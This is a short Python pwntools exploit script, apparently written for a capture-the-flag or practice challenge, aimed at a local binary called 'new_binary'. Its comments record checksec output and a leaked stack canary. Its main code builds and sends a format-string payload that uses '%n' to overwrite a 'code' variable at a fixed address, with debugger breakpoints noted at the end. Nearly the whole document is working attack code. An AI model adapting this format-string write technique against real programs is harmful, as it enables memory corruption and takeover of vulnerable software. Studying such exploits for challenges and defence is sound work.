#! /usr/bin/python

from pwn import *

"""
static analysis:
CHECKSEC:
	Arch:     amd64-64-little
	RELRO:    Partial RELRO
	Stack:    Canary found
	NX:       NX enabled
	PIE:      No PIE (0x400000)

[+] Found AT_RANDOM at 0x7fffffffdf99, reading 8 bytes
[+] The canary of process 5260 is 0x92f316ab6f52df00

# address of variable code: 0x601084 / 64b: 0x00000000601084

"""
context.log_level = "critical"
context.terminal = ["terminator", "-e"]

code_addr = 0x60106c

sh = process('./new_binary', aslr=False)

try:
	attach(sh)
	print sh.clean()
	#print sh.recvuntil("> ")
	payload = p32(0x00000539) + p64(code_addr)+'%n'

	sh.sendline(payload)


	print sh.recv().split("\n")[0].split(",")[-1].strip() # leak stack


	sh.close()
	# when we get a shell
	#sh.interactive()

except:
	# EOF
	sh.close()	


"""
breaks: 
# before input	& after
b * 0x00000000004006f3 
b * 0x0000000000400702
"""